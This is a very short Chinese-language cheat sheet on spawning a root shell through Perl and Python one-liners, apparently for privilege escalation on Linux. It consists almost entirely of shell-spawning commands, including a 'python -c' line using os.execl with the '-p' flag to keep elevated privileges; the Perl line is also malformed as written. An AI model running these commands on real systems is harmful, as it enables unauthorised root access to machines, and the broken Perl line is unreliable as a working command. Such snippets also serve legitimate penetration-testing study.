#python/perl 脚本语言一句话提权root

- perl

```
perl exec "/bin/bash";
```
- python

脚本方式：

```
import os
os.system("/bin/bash")
```
或者使用一句话命令：

```
python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```
